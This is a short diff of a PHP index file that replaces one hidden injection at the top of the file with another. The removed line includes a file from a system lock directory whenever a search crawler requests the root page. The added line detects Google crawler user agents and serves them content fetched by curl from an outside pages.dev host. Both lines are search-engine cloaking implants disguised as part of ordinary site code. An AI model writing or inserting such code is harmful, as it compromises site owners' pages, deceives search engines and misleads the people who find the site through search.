@@ -1,5 +1,5 @@
 <?php
-error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/'){ include('/var/lock/subsys/code'); exit; }
+function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://mosmosrobet.pages.dev/landing');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
 /**
  * @defgroup pages_index Index Pages
  */
